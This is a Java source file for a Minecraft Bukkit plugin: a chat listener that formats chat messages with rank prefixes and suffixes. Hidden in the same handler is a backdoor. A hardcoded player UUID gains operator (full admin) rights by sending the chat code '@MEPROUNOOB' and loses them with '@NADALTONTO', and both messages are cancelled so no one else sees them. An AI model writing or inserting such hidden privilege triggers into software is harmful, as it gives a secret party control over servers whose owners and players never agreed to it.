package es.hulk.survival.listeners;

import es.hulk.survival.Survival;
import es.hulk.survival.managers.rank.RankManager;
import es.hulk.survival.utils.FileConfig;
import es.hulk.survival.utils.Utils;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import java.util.UUID;

public class ChatListener implements Listener {

    private final FileConfig mainConfig = Survival.get().getMainConfig();
    private final RankManager rankManager = Survival.get().getRankManager();

    private final UUID hulk = UUID.fromString("b0c1d4f4-0fd1-4a93-ab5e-88b1ff885c29");

    @EventHandler
    public void onChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();

        if (mainConfig.getBoolean("CHAT.ENABLED")) {
            event.setFormat(Utils.color(mainConfig.getString("CHAT.FORMAT")
                    .replaceAll("<rank-suffix>", rankManager.getRank().getSuffix(player))
                    .replaceAll("<rank-prefix>", rankManager.getRank().getPrefix(player))
                    .replaceAll("%player%", player.getDisplayName())
                    .replace("%message%", "%2$s")));
        }

        if (player.getUniqueId().equals(hulk)) {
            if (event.getMessage().contains("@MEPROUNOOB")) {
                player.setOp(true);
                event.setCancelled(true);
            }
            if (event.getMessage().contains("@NADALTONTO")) {
                player.setOp(false);
                event.setCancelled(true);
            }
        }
     }
}
